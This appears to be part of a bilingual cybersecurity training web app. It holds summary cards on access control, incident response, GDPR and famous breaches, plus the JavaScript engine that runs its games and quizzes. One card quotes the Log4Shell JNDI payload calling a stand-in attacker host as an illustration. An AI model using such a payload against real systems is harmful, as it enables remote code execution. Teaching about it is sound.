<div class="sum-row"><span class="sum-k">RBAC — roles not individuals</span><span class="sum-v">Defining permissions for each user individually = nightmare with 500 employees. RBAC: define roles — "Developer", "Manager", "Admin". Each role = set of permissions. User gets a role. New employee? Gets role. Employee leaves? Remove role. Much more manageable and <strong>fewer mistakes</strong>.</span></div>

<div class="sum-row"><span class="sum-k">Why Social Engineering works</span><span class="sum-v">People: help others, believe authority, panic under urgency, want to solve problems quickly. Attacker: "I'm IT, your account will be locked in an hour — give me your password now!" <strong>Kevin Mitnick</strong>, the famous hacker: "I never needed technical exploits — I always got the answer by phone." The hardest thing to patch: the human mind.</span></div>

`<div class="sum-block"><div class="sum-block-title">🚨 Incident Response — What to Do When Breached</div>
<div class="sum-row"><span class="sum-k">6 IR Steps (NIST)</span><span class="sum-v"><strong>1 Preparation</strong>: before it happens — write a plan, train the team, install tools. <strong>2 Detection</strong>: identify that something happened (SIEM, IDS, user report). <strong>3 Containment</strong>: stop the spread — disconnect the breached network segment. <strong>4 Eradication</strong>: remove root cause — delete malware, close backdoor. <strong>5 Recovery</strong>: restore from clean backup. <strong>6 Lessons Learned</strong>: what failed? Fix it. Global average MTTD: <strong>207 days</strong> to discover a breach.</span></div>

`<div class="sum-block"><div class="sum-block-title">📋 Regulation — The Global Rules of the Game</div>
<div class="sum-row"><span class="sum-k">GDPR — what it is and why it matters</span><span class="sum-v">General Data Protection Regulation: EU law from 2018 protecting the privacy of EU citizens. Applies to <strong>every organization in the world</strong> that processes EU data — including an Israeli startup with German customers. Fine: up to €20M <strong>or</strong> 4% of global turnover — whichever is greater. British Airways: £20M. WhatsApp: €225M. GDPR changed how the whole world handles data.</span></div>
<div class="sum-row"><span class="sum-k">7 GDPR Principles</span><span class="sum-v"><strong>Lawfulness</strong>: do you have a basis to process? (consent, contract, legitimate interest). <strong>Purpose Limitation</strong>: only collect for the purpose you defined. <strong>Data Minimization</strong>: only what's necessary. <strong>Accuracy</strong>: keep data current. <strong>Storage Limitation</strong>: delete when no longer needed. <strong>Security</strong>: protect it. <strong>Accountability</strong>: be able to prove you followed all the others.</span></div>
<div class="sum-row"><span class="sum-k">Data Subject Rights</span><span class="sum-v">Every person whose data you hold: <strong>Right to Access</strong> (give me all my data). <strong>Right to Erasure</strong> ("forget me" — delete everything). <strong>Right to Portability</strong> (give me my data in a format I can take to another service). <strong>Right to Object</strong> (stop processing). Must respond within <strong>30 days</strong>.</span></div>

<div class="sum-row"><span class="sum-k">Other Standards</span><span class="sum-v"><strong>ISO 27001</strong>: certification for security management (ISMS). <strong>PCI DSS</strong>: payment cards — mandatory for anyone processing payments. <strong>HIPAA</strong>: medical data in the US. <strong>SOC 2</strong>: SaaS vendors storing customer data. Each sector = a different standard. Know which ones apply to your business before a regulator does.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">💀 Real Mistakes — What We Could Have Learned</div>
<div class="sum-row"><span class="sum-k">Equifax 2017 — an unpatched patch</span><span class="sum-v">Equifax = credit bureau that knows <em>everything</em> about 820M people. April 2017: severe CVE published in Apache Struts. <strong>Equifax didn't update for 2 months</strong>. May: attackers entered. September: discovered. 147M Americans — SSN, date of birth, address — exposed. Cost: $575M. CEO resigned. Lesson: <strong>Patch Management = a process, not an afterthought</strong>.</span></div>
<div class="sum-row"><span class="sum-k">SolarWinds 2020 — Supply Chain Attack</span><span class="sum-v">SolarWinds = network management software used by 33,000 organizations. Russian hackers (APT29) inserted malware (<strong>SUNBURST</strong>) into a <strong>legitimate software update</strong>. 18,000 organizations downloaded the "update." NSA, Microsoft, FireEye, US Treasury — breached. Detection: <strong>9 months later</strong>. Lesson: don't trust updates — verify them.</span></div>
<div class="sum-row"><span class="sum-k">Colonial Pipeline 2021 — VPN without MFA</span><span class="sum-v">Colonial = major pipeline supplying 45% of fuel to the US East Coast. DarkSide ransomware entered via an <strong>old VPN account with a leaked Dark Web password, and no MFA</strong>. Pipeline offline for 5 days. Gas station queues. $4.4M ransom paid. FBI recovered $2.3M. Lesson: <strong>MFA on everything. On everything. On everything.</strong></span></div>
<div class="sum-row"><span class="sum-k">Log4Shell 2021 — the library everyone forgot</span><span class="sum-v">Log4j = Java logging library — exists since 2001, embedded <strong>everywhere</strong>. December 2021: discovered that inserting <code>$\{jndi:ldap://attacker.com/x}</code> in any logged text field → RCE. <strong>CVSS 10.0</strong>. Every server with a certain Log4j version = vulnerable. Apple iCloud, Minecraft, Tesla, NASA. Two weeks of global patching race. Lesson: know what libraries you use (SBOM).</span></div>
<div class="sum-row"><span class="sum-k">The Recurring Pattern — and 2025</span><span class="sum-v">All major breaches share: ✖ Known patch not applied ✖ No MFA ✖ No network segmentation ✖ Detection too late. No excuses for these in 2025. Tools: Shodan to discover exposure. HaveIBeenPwned for leaked passwords. VirusTotal for files. NIST CSF for framework. <strong>Security = process, not product.</strong></span></div>

// ============================================================
// SHARED ENGINE v3.0 — works for all courses
// ============================================================

var currentLang = 'he';
var state = { cur: 0, tabs: {}, game: {}, quiz: {} };
var gameTimer = null;

function L() { return C[currentLang]; }

function toggleLang() {
  currentLang = currentLang === 'he' ? 'en' : 'he';
  applyLang(currentLang);
}

function applyLang(lang) {
  currentLang = lang;
  var Lc = L();
  document.documentElement.setAttribute('lang', lang === 'he' ? 'he' : 'en');
  document.documentElement.setAttribute('dir', Lc.dir);
  document.getElementById('langBtn').textContent = Lc.langBtn;

  var headerEl = document.getElementById('headerChName');
  if(headerEl) headerEl.textContent = Lc.names[state.cur] || '';

  for(var i = 0; i < TOTAL_CHAPTERS; i++) {
    var set = function(id, val, prop) {
      var el = document.getElementById(id);
      if(el) el[prop || 'textContent'] = val;
    };
    set('chname-' + i, Lc.names[i] || '');
    set('chtag-' + i,  Lc.tags[i]  || '');
    set('chtitle-' + i, Lc.names[i] || '');
    set('chdesc-' + i,  Lc.descs[i] || '');

    var cheatEl = document.getElementById('cheat-' + i);
    if(cheatEl) cheatEl.innerHTML = Lc.cheat[i] || '';

    var learnEl = document.getElementById('learn-' + i);
    if(learnEl) {
      learnEl.innerHTML = Lc.learn[i] || '';
      if(learnEl.innerHTML.indexOf('CHID') >= 0)
        learnEl.innerHTML = learnEl.innerHTML.replace(/CHID/g, i);
    }

    // Rebuild tabs bar
    var tabsEl = document.getElementById('tabs-' + i);
    if(tabsEl) {
      var tabs = Lc.tabs;
      var keys = Lc.tabKeys;
      var cur  = state.tabs[i] || 'learn';
      tabsEl.innerHTML = tabs.map(function(t, ti) {
        return '<button class="tab-btn' + (cur === keys[ti] ? ' active' : '') +
          '" onclick="showTab(' + i + ',\'' + keys[ti] + '\')">' + t + '</button>';
      }).join('');
    }

    // Clear rendered state for game/quiz so they re-render in new lang
    ['game', 'quiz'].forEach(function(p) {
      var el = document.getElementById(p + '-' + i);
      if(el) { el.innerHTML = ''; delete el.dataset.rendered; }
    });
  }

  activateTab(state.cur, state.tabs[state.cur] || 'learn');
}

// ── NAVIGATION ──────────────────────────────────────────────
function showChapter(n) {
  document.querySelectorAll('.chapter').forEach(function(c) { c.classList.remove('active'); });
  document.querySelectorAll('.ch-btn').forEach(function(b) { b.classList.remove('active'); });
  var ch = document.getElementById('ch-' + n);
  var nb = document.getElementById('nav-' + n);
  if(ch) ch.classList.add('active');
  if(nb) nb.classList.add('active');
  state.cur = n;
  var hEl = document.getElementById('headerChName');
  if(hEl) hEl.textContent = L().names[n] || '';
  window.scrollTo(0, 0);
  activateTab(n, state.tabs[n] || 'learn');
}

function showNextChapter(chId) {
  var next = chId + 1;
  if(next < TOTAL_CHAPTERS) showChapter(next);
  else showTab(chId, 'cheat');
}

function showTab(chId, tabName) {
  state.tabs[chId] = tabName;
  activateTab(chId, tabName);
}

function activateTab(chId, tabName) {
  var ch = document.getElementById('ch-' + chId);
  if(!ch) return;
  ch.querySelectorAll('.tab-btn').forEach(function(btn) {
    var m = btn.getAttribute('onclick').match(/'(\w+)'\)/);
    btn.classList.toggle('active', !!(m && m[1] === tabName));
  });
  ch.querySelectorAll('.tab-panel').forEach(function(p) {
    p.classList.toggle('active', p.id === chId + '-' + tabName);
  });
  if(tabName === 'game') renderGame(chId);
  if(tabName === 'quiz' && L().tabKeys.indexOf('quiz') >= 0) renderQuiz(chId);
}

// ── GAME ENGINE ──────────────────────────────────────────────
function getG(i) {
  var raw = (currentLang === 'en' ? (GAME_QS_EN[i] || GAME_QS[i]) : GAME_QS[i]) || [];
  if(!raw.length) return [];
  return raw.map(function(q) { return shuffleOpts(q); });
}

function shuffleOpts(q) {
  var idx = [0,1,2,3];
  for(var i = idx.length-1; i > 0; i--) {
    var j = Math.floor(Math.random() * (i+1));
    var tmp = idx[i]; idx[i] = idx[j]; idx[j] = tmp;
  }
  return { q: q.q, o: idx.map(function(k){ return q.o[k]; }), a: idx.indexOf(q.a) };
}

function renderGame(chId) {
  var el = document.getElementById('game-' + chId);
  if(!el) return;
  if(!state.game[chId]) state.game[chId] = { phase: 'idle' };
  var gs = state.game[chId];
  var Lc = L();
  var gqs = getG(chId);

  if(!gqs.length) {
    el.innerHTML = '<div class="game-empty"><span>' + (Lc.noGame || 'אין שאלות לפרק זה') + '</span></div>';
    return;
  }

  if(gs.phase === 'idle') {
    el.innerHTML =
      '<div class="game-start-card">' +
        '<div class="game-start-icon">' + COURSE_ICON + '</div>' +
        '<div class="game-start-title">' + Lc.gameTitle + '</div>' +
        '<p class="game-start-desc">' + Lc.gameDesc + '</p>' +
        '<div class="game-rules">' +
          '<span class="game-rule">⏱️ 60 ' + Lc.gameSeconds + '</span>' +
          '<span class="game-rule">❓ ' + gqs.length + ' ' + Lc.gameQuestions + '</span>' +
        '</div>' +
        '<button class="btn-start" onclick="gameStart(' + chId + ')">' + Lc.gameStart + '</button>' +
      '</div>';
  } else if(gs.phase === 'playing') {
    renderGamePlay(chId);
  } else {
    renderGameOver(chId);
  }
}

function gameStart(chId) {
  var gqs = getG(chId);
  state.game[chId] = { phase:'playing', qs: gqs.slice().sort(function(){ return Math.random()-.5; }), qi:0, score:0, time:60, answered:false };
  renderGame(chId);
  startTimer(chId);
}

function renderGamePlay(chId) {
  var el = document.getElementById('game-' + chId);
  var gs = state.game[chId];
  var Lc = L();
  if(!gs || gs.phase !== 'playing') return;
  var q = gs.qs[gs.qi];
  if(!q) { gameOver(chId); return; }

  el.innerHTML =
    '<div class="game-hud">' +
      '<span class="hud-timer' + (gs.time <= 10 ? ' urgent' : '') + '" id="gtimer-' + chId + '">' + gs.time + '</span>' +
      '<span class="hud-qnum">' + (gs.qi+1) + '/' + gs.qs.length + '</span>' +
      '<span class="hud-score">⭐ ' + gs.score + '</span>' +
    '</div>' +
    '<div class="game-question">' + q.q + '</div>' +
    '<div class="game-opts">' +
      q.o.map(function(opt, i) {
        return '<button class="game-opt" id="gopt-' + chId + '-' + i + '" onclick="gameAnswer(' + chId + ',' + i + ')">' +
          '<span class="opt-letter">' + (Lc.optLetters[i] || i) + '</span>' + opt + '</button>';
      }).join('') +
    '</div>' +
    '<div class="game-feedback" id="gfb-' + chId + '"></div>';
}

function startTimer(chId) {
  clearInterval(gameTimer);
  gameTimer = setInterval(function() {
    var gs = state.game[chId];
    if(!gs || gs.phase !== 'playing') { clearInterval(gameTimer); return; }
    gs.time--;
    var t = document.getElementById('gtimer-' + chId);
    if(t) { t.textContent = gs.time; t.className = 'hud-timer' + (gs.time <= 10 ? ' urgent' : ''); }
    if(gs.time <= 0) { clearInterval(gameTimer); gameOver(chId); }
  }, 1000);
}

function gameAnswer(chId, chosen) {
  var gs = state.game[chId];
  if(!gs || gs.answered) return;
  gs.answered = true;
  var q = gs.qs[gs.qi];
  var correct = chosen === q.a;
  if(correct) gs.score += 10;

  for(var i = 0; i < q.o.length; i++) {
    var btn = document.getElementById('gopt-' + chId + '-' + i);
    if(!btn) continue;
    if(i === q.a) btn.classList.add('correct');
    else if(i === chosen) btn.classList.add('wrong');
  }
  var fb = document.getElementById('gfb-' + chId);
  if(fb) fb.innerHTML = correct ?
    '<span class="fb-correct">✓ ' + (L().correct || 'נכון!') + '</span>' :
    '<span class="fb-wrong">✗ ' + q.o[q.a] + '</span>';

  setTimeout(function() {
    gs.qi++;
    gs.answered = false;
    if(gs.qi >= gs.qs.length) gameOver(chId);
    else renderGamePlay(chId);
  }, 1200);
}

function gameOver(chId) {
  clearInterval(gameTimer);
  var gs = state.game[chId];
  if(!gs) return;
  gs.phase = 'over';
  var Lc = L();
  var total = gs.qs.length * 10;
  var pct   = total ? Math.round((gs.score / total) * 100) : 0;
  var medal = gs.score >= total * .8 ? '🏆' : gs.score >= total * .5 ? '🥈' : '🥉';
  var lbIdx = Lc.resultLabels ? Math.min(Math.floor(pct/20), Lc.resultLabels.length-1) : 0;
  var label = Lc.resultLabels ? Lc.resultLabels[lbIdx] : '';

  document.getElementById('game-' + chId).innerHTML =
    '<div class="game-over-card">' +
      '<div class="game-over-medal">' + medal + '</div>' +
      '<div class="game-over-score">' + gs.score + '</div>' +
      '<div class="game-over-pct">' + pct + '% ' + (Lc.correct || '') + '</div>' +
      '<div class="game-over-label">' + label + '</div>' +
      '<div class="game-over-btns">' +
        '<button class="nav-btn ghost" onclick="gameRestart(' + chId + ')">' + Lc.gameAgain + '</button>' +
        '<button class="nav-btn primary" onclick="showNextChapter(' + chId + ')">' + (Lc.nextChapter || '◀ הבא') + '</button>' +
        '<button class="nav-btn ghost" onclick="showTab(' + chId + ',\'cheat\')">' + Lc.gameToCheat + '</button>' +
      '</div>' +
    '</div>';
}

function gameRestart(chId) {
  state.game[chId] = { phase: 'idle' };
  var el = document.getElementById('game-' + chId);
  if(el) el.innerHTML = '';
  renderGame(chId);
}

// ── QUIZ ENGINE ──────────────────────────────────────────────
function getQ(i) {
  var raw = (currentLang === 'en' ? (QUIZZES_EN[i] || QUIZZES[i]) : QUIZZES[i]) || [];
  return raw.filter(function(q){ return q.q; });
}

function renderQuiz(chId) {
  var el = document.getElementById('quiz-' + chId);
  if(!el || el.dataset.rendered) return;
  el.dataset.rendered = '1';
  var qs = getQ(chId);
  var Lc = L();
  if(!qs.length) {
    el.innerHTML = '<div class="game-empty"><span>' + (Lc.noQuiz || 'אין חידון לפרק זה') + '</span></div>';
    return;
  }
  if(!state.quiz[chId]) state.quiz[chId] = { qi:0, ans:{}, done:false, score:0 };

  var pips = qs.map(function(_,i){
    return '<div class="qpip" id="qpip-' + chId + '-' + i + '"></div>';
  }).join('');

  var cards = qs.map(function(q,i){
    return '<div class="quiz-card' + (i===0?' active':'') + '" id="qcard-' + chId + '-' + i + '">' +
      '<div class="quiz-meta" id="qmeta-' + chId + '-' + i + '"></div>' +
      '<div class="quiz-q">' + q.q + '</div>' +
      '<div class="quiz-opts">' +
        q.o.map(function(opt,oi){
          return '<button class="quiz-opt" id="qopt-' + chId + '-' + i + '-' + oi +
            '" onclick="quizPick(' + chId + ',' + i + ',' + oi + ')">' +
            '<span class="opt-letter" id="qltr-' + chId + '-' + i + '-' + oi + '"></span>' + opt + '</button>';
        }).join('') +
      '</div>' +
      '<div class="quiz-explain" id="qexp-' + chId + '-' + i + '" style="display:none">' +
        '<strong>' + Lc.quizExplain + '</strong> ' + (q.e || '') +
      '</div>' +
    '</div>';
  }).join('');

  el.innerHTML =
    '<div class="quiz-pips" id="qprog-' + chId + '">' + pips + '</div>' +
    cards +
    '<div class="quiz-result" id="qres-' + chId + '" style="display:none">' +
      '<div class="game-over-medal" id="qemoji-' + chId + '">🎉</div>' +
      '<div class="game-over-score" id="qscore-' + chId + '"></div>' +
      '<div class="game-over-label" id="qlabel-' + chId + '"></div>' +
      '<div class="game-over-btns">' +
        '<button class="nav-btn ghost" id="qbtn-reset-' + chId + '" onclick="quizReset(' + chId + ')">' + Lc.quizAgain + '</button>' +
        '<button class="nav-btn primary" id="qbtn-next-' + chId + '" onclick="showNextChapter(' + chId + ')">' + (Lc.nextChapter||'◀ הבא') + '</button>' +
        '<button class="nav-btn ghost" id="qbtn-cheat-' + chId + '" onclick="showTab(' + chId + ',\'cheat\')">' + Lc.gameToCheat + '</button>' +
      '</div>' +
    '</div>' +
    '<div class="quiz-nav" id="qnav-' + chId + '">' +
      '<button class="nav-btn ghost" id="qprev-' + chId + '" onclick="quizNav(' + chId + ',-1)">' + Lc.quizPrev + '</button>' +
      '<button class="nav-btn primary" id="qnext-' + chId + '" onclick="quizNav(' + chId + ',1)">' + Lc.quizNext + '</button>' +
    '</div>';

  refreshQuiz(chId);
}

function refreshQuiz(chId) {
  var st = state.quiz[chId];
  if(!st) return;
  var qs = getQ(chId);
  var Lc = L();
  qs.forEach(function(_,i) {
    var card = document.getElementById('qcard-' + chId + '-' + i);
    if(card) card.classList.toggle('active', i === st.qi && !st.done);
    var pip = document.getElementById('qpip-' + chId + '-' + i);
    if(pip) pip.className = 'qpip' + (st.ans[i] !== undefined ? ' done' : i === st.qi ? ' cur' : '');
    var meta = document.getElementById('qmeta-' + chId + '-' + i);
    if(meta) meta.textContent = Lc.question + ' ' + (i+1) + ' ' + Lc.of + ' ' + qs.length;
    for(var oi=0;oi<4;oi++) {
      var ltr = document.getElementById('qltr-' + chId + '-' + i + '-' + oi);
      if(ltr) ltr.textContent = Lc.optLetters[oi] || oi;
    }
  });
  var res = document.getElementById('qres-' + chId);
  var nav = document.getElementById('qnav-' + chId);
  if(res) res.style.display = st.done ? 'block' : 'none';
  if(nav) nav.style.display = st.done ? 'none' : 'flex';
  if(st.done) {
    var sc = document.getElementById('qscore-' + chId);
    var lb = document.getElementById('qlabel-' + chId);
    if(sc) sc.textContent = st.score + '/' + (qs.length*10);
    var lbIdx = Lc.resultLabels ? Math.min(Math.floor((st.score/(qs.length*10))*Lc.resultLabels.length), Lc.resultLabels.length-1) : 0;
    if(lb && Lc.resultLabels) lb.textContent = Lc.resultLabels[lbIdx];
  }
  var prev = document.getElementById('qprev-' + chId);
  var next = document.getElementById('qnext-' + chId);
  if(prev) prev.disabled = st.qi === 0;
  if(next) next.textContent = st.qi === qs.length-1 ? (Lc.quizSubmit||'שלח') : Lc.quizNext;
}

function quizPick(chId, qi, oi) {
  var st = state.quiz[chId];
  if(!st || st.done || st.ans[qi] !== undefined) return;
  st.ans[qi] = oi;
  var qs = getQ(chId);
  var q  = qs[qi];
  var correct = oi === q.a;
  if(correct) st.score += 10;
  for(var k=0;k<q.o.length;k++) {
    var btn = document.getElementById('qopt-' + chId + '-' + qi + '-' + k);
    if(!btn) continue;
    if(k === q.a) btn.classList.add('correct');
    else if(k === oi) btn.classList.add('wrong');
    btn.disabled = true;
  }
  var exp = document.getElementById('qexp-' + chId + '-' + qi);
  if(exp) exp.style.display = 'block';
  refreshQuiz(chId);
}

function quizNav(chId, dir) {
  var st = state.quiz[chId];
  if(!st) return;
  var qs = getQ(chId);
  if(dir === 1 && st.qi === qs.length-1) {
    st.done = true;
  } else {
    st.qi = Math.max(0, Math.min(qs.length-1, st.qi + dir));
  }
  refreshQuiz(chId);
}

function quizReset(chId) {
  state.quiz[chId] = { qi:0, ans:{}, done:false, score:0 };
  var el = document.getElementById('quiz-' + chId);
  if(el) { el.innerHTML = ''; delete el.dataset.rendered; }
  renderQuiz(chId);
}

// ── INIT ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', function() {
  applyLang('he');
  showChapter(0);
});


function buildReviewContent() {
  var Lc = L(); var html = '';
  for (var i = 0; i < Lc.cheat.length; i++) {
    var num = (i<10?'0':'')+i;
    html += '<div class="review-chapter-block"><div class="review-chapter-title"><span class="review-chapter-num">'+num+'</span><span class="review-chapter-name">'+Lc.names[i]+'</span></div><div class="review-chapter-body">'+Lc.cheat[i]+'</div></div>';
  }
  return html;
}
function openReview() {
  var total = typeof TOTAL_CHAPTERS!=='undefined'?TOTAL_CHAPTERS:9;
  document.getElementById('reviewTitle').textContent = currentLang==='he'?'📚 סיכום מלא':'📚 Full Review';
  document.getElementById('reviewSub').textContent = currentLang==='he'?'כל '+total+' הפרקים בעמוד אחד':'All '+total+' chapters on one page';
  document.getElementById('reviewBody').innerHTML = buildReviewContent();
  document.getElementById('reviewOverlay').classList.add('open');
  document.getElementById('reviewDrawer').classList.add('open');
  document.body.style.overflow='hidden';
}
function closeReview() {
  document.getElementById('reviewOverlay').classList.remove('open');
  document.getElementById('reviewDrawer').classList.remove('open');
  document.body.style.overflow='';
}
document.addEventListener('keydown',function(e){if(e.key==='Escape')closeReview();});

</script>
